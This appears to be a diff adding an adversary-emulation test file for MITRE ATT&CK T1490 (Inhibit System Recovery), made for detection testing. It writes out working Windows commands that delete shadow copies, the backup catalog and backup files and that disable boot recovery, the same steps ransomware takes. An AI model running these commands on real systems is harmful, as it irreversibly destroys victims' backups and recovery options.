@@ -1,0 +1,94 @@
+attack_technique: T1490
+display_name: Inhibit System Recovery
+atomic_tests:
+- name: Windows - Delete Volume Shadow Copies
+  auto_generated_guid: 43819286-91a9-4369-90ed-d31fb4da2c01
+  description: |
+    Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon
+    execution, if no shadow volumes exist the message "No items found that satisfy the query." will be displayed. If shadow volumes are present, it
+    will delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n
+    confirmation prompt. Shadow copies can only be created on Windows server or Windows 8.
+
+    https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Create volume shadow copy of C:\ . This prereq command only works on Windows Server or Windows 8.
+    prereq_command: |
+      if(!(vssadmin.exe list shadows | findstr "No items found that satisfy the query.")) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      vssadmin.exe create shadow /for=c:
+  executor:
+    command: |
+      vssadmin.exe delete shadows /all /quiet
+    name: command_prompt
+    elevation_required: true
+- name: Windows - Delete Volume Shadow Copies via WMI
+  auto_generated_guid: 6a3ff8dd-f49c-4272-a658-11c2fe58bd88
+  description: |
+    Deletes Windows Volume Shadow Copies via WMI. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
+    Shadow copies can only be created on Windows server or Windows 8.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      wmic.exe shadowcopy delete
+    name: command_prompt
+    elevation_required: true
+- name: Windows - Delete Windows Backup Catalog
+  auto_generated_guid: 263ba6cb-ea2b-41c9-9d4e-b652dadd002c
+  description: |
+    Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,
+    "The backup catalog has been successfully deleted." will be displayed in the PowerShell session.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      wbadmin.exe delete catalog -quiet
+    name: command_prompt
+    elevation_required: true
+- name: Windows - Disable Windows Recovery Console Repair
+  auto_generated_guid: cf21060a-80b3-4238-a595-22525de4ab81
+  description: |
+    Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
+    Upon execution, "The operation completed successfully." will be displayed in the powershell session.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
+      bcdedit.exe /set {default} recoveryenabled no
+    cleanup_command: |
+      bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures >nul 2>&1
+      bcdedit.exe /set {default} recoveryenabled yes >nul 2>&1
+    name: command_prompt
+    elevation_required: true
+- name: Windows - Delete Volume Shadow Copies via WMI with PowerShell
+  auto_generated_guid: 39a295ca-7059-4a88-86f6-09556c1211e7
+  description: |
+    Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject.
+    This technique is used by numerous ransomware families such as Sodinokibi/REvil.
+    Executes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution
+    there may be no output displayed.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
+    name: powershell
+    elevation_required: true
+- name: Windows - Delete Backup Files
+  auto_generated_guid: 6b1dbaf6-cc8a-4ea6-891f-6058569653bf
+  description: |
+    Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many "access is denied" messages will appear as the commands try
+    to delete files from around the system.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
+    name: command_prompt
+    elevation_required: true
+
